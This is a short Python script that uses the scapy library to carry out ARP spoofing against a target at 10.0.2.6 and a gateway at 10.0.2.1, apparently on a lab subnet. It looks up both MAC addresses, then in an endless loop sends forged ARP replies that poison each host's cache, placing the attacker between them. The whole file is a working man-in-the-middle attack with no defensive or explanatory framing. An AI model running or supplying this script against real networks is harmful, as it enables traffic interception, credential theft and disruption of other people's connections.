import scapy.all as scapy
import binascii
import re
import sys
from io import StringIO
import time

# Creating an ARP Packet

OP = 2 #for response

def getMac(IP):
    arp_packet = scapy.ARP(pdst=IP)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast = broadcast/arp_packet
    broadcast = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    mac_addr_str = capture_output(broadcast)
    print(mac_addr_str)
    mac_addr = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', mac_addr_str)
    return mac_addr[0]

def capture_output(to_perform):
    capture = StringIO()
    temp_stdout = sys.stdout
    sys.stdout = capture
    to_perform.show()
    sys.stdout = temp_stdout
    return capture.getvalue()

def generatePacket(target_ip, sender_ip):
    target_mac = getMac(target_ip)
    target_arp = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=sender_ip)

    target_mac = getMac(sender_ip)
    target_router = scapy.ARP(op=2, hwdst=target_mac, pdst=sender_ip, psrc=target_ip)

    return target_arp, target_router

def sendPacket():
    target_arp, target_router = generatePacket('10.0.2.6','10.0.2.1')
    scapy.send(target_arp)
    scapy.send(target_router)
    print("[+] Packet Sent!")
    time.sleep(2)

while True:
    sendPacket()
